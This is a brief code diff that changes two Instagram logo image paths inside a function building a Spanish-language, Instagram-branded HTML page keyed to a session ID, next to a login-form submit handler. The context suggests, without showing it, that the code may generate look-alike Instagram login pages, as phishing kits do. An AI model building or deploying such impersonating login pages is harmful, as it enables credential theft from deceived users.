@@ -378,8 +378,8 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
 }
 
 function buildInstagramPage(sessionId: string): string {
-  const igCameraIcon = `<img src="/assets/ig-logo.png" alt="Instagram" width="96" height="96" style="display:block;">`;
-  const igCameraSmall = `<img src="/assets/ig-logo.png" alt="Instagram" width="72" height="72" style="display:block;">`;
+  const igCameraIcon = `<img src="/api/assets/ig-logo.png" alt="Instagram" width="96" height="96" style="display:block;">`;
+  const igCameraSmall = `<img src="/api/assets/ig-logo.png" alt="Instagram" width="72" height="72" style="display:block;">`;
   return `<!DOCTYPE html>
 <html lang="es">
 <head>
